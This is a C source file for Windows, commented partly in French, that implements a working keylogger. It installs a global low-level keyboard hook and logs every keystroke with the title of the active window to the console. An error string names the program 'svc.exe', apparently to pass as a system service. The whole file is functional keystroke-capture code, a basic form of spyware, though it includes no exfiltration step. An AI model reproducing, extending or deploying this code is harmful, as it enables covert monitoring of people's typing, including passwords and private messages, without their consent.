#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winuser.h>
#include <tlhelp32.h>
#include <Strsafe.h>
#include <stdlib.h>
#include <locale.h>
#include <wingdi.h>

HHOOK winHook;

int PrintError(void)
{
    int err = GetLastError();
    int sz;
    char buf[512];

    sz = FormatMessage( FORMAT_MESSAGE_FROM_SYSTEM |
        FORMAT_MESSAGE_IGNORE_INSERTS,
        NULL,
        err,
        0,
        buf,
        512,
        NULL );
    if (!sz)//the error is not known
    {
        printf("Unknown error.\n");
        return ERROR;
    }
    printf(u8"Error svc.exe %d : %hs\n", err, buf);
    return ERROR;
}

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode < 0)  // do not process message if nCode < 0 or when the key is upping
        return CallNextHookEx(winHook, nCode, wParam, lParam); 
    PKBDLLHOOKSTRUCT keyInfos = (PKBDLLHOOKSTRUCT)lParam;// struct qui contient les informations concernant la frappe.
    HWND foregroundWindow =  GetForegroundWindow();
    DWORD fgWindowTID = GetWindowThreadProcessId(foregroundWindow, NULL);
    int windowTitleLen = GetWindowTextLength(foregroundWindow);
    WCHAR keyByte[5] = {0};//for unicode we may need more than 1 byte
    BYTE keyState[256] = {0};
    DWORD currentTid = GetCurrentThreadId();
    LPSTR windowTitle = malloc(sizeof(char) * ((size_t)windowTitleLen + 1));
    static BOOL is_deadkey_state = FALSE;
    if (windowTitle == NULL)
        return CallNextHookEx(winHook, nCode, wParam, lParam);
    GetWindowTextA(foregroundWindow, windowTitle, windowTitleLen + 1);
    AttachThreadInput(currentTid, fgWindowTID, TRUE);// we need that in order to have the keystate of the foreground window, not the current thread's key state
    if (is_deadkey_state == FALSE)
        if (!GetKeyboardState((PBYTE)&keyState))
            PrintError();
    HKL keyboardLayout = GetKeyboardLayout(fgWindowTID);
    INT res = ToUnicodeEx(keyInfos->vkCode, keyInfos->scanCode, keyState, (LPWSTR)&keyByte, 4, 0x4, keyboardLayout);
    if (res <= 0)
    {
        is_deadkey_state = TRUE;
        goto FREE_AND_CALLBACK;
    }
    else if (res > 0)
    {
        if (wParam != WM_KEYUP)
        {
            printf("Dans la fenetre : %s\nTouche : %ws\n", windowTitle, keyByte);
            is_deadkey_state = FALSE;
        }
    }
FREE_AND_CALLBACK:
    free(windowTitle);
    AttachThreadInput(currentTid, fgWindowTID, FALSE);
    return CallNextHookEx(winHook, nCode, wParam, lParam);
}

int main(void)
{
    winHook = SetWindowsHookExA(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0);

    if (winHook == NULL)
    {
        exit(PrintError());
    }
    MSG msg;

    while(GetMessage(&msg, NULL, 0, 0))
    {
        // TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    UnhookWindowsHookEx(winHook);
}